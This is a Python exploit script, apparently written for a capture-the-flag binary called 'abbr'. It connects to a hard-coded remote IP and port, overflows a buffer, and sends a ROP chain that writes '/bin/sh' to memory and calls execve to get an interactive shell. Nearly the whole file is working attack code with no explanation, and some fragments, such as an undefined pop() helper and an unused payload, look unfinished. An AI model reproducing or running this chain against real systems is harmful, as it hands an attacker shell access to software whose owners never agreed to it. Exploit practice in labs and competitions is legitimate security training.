#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./abbr')

host = args.HOST or '168.119.108.148'
port = int(args.PORT or 10010)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
b *main+190
b *main
'''.format(**locals())

# -- Exploit goes here --

def send_data(text):
    sla(b"Enter text: ", text)

IMAGE_BASE_0 = 0x0000000000400000 # 201a6dd2ceb8122a4434b5adc02944af034fd17192c6d93119abc2b2c6d213bd
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x0000000000011593) # 0x0000000000411593: pop r13; ret; 
rop += b'/bin/sh\x00'
rop += rebase_0(0x000000000000222b) # 0x000000000040222b: pop rbx; ret; 
rop += rebase_0(0x00000000000c90e0)
rop += rebase_0(0x00000000000753e5) # 0x00000000004753e5: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x0000000000011593) # 0x0000000000411593: pop r13; ret; 
rop += p(0x0000000000000000)
rop += rebase_0(0x000000000000222b) # 0x000000000040222b: pop rbx; ret; 
rop += rebase_0(0x00000000000c90e8)
rop += rebase_0(0x00000000000753e5) # 0x00000000004753e5: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += p(0xdeadbeefdeadbeef)
rop += rebase_0(0x00000000000018da) # 0x00000000004018da: pop rdi; ret; 
rop += rebase_0(0x00000000000c90e0)
rop += rebase_0(0x0000000000004cfe) # 0x0000000000404cfe: pop rsi; ret; 
rop += rebase_0(0x00000000000c90e8)
rop += rebase_0(0x00000000000017df) # 0x00000000004017df: pop rdx; ret; 
rop += rebase_0(0x00000000000c90e8)
rop += rebase_0(0x000000000005a8f7) # 0x000000000045a8f7: pop rax; ret; 
rop += p(0x000000000000003b)
rop += rebase_0(0x000000000001e504) # 0x000000000041e504: syscall; ret; 

ll = flat([

    pop("r13", b"/bin/sh\x00"),
    pop("rbx", rebase_0(0x00000000000c90e0)),
    rebase_0(0x00000000000753e5),
    0x0*3,


])


fuck = b"hf"*514 + p(0x0000000000405121)

payload = b"noob"*685 + p64(0xdeadbeef) + p(0xcafebabe) # + p(exe.got['__libc_start_main'])

io = start()
send_data(fuck)
re()
send_data(rop)
io.interactive()

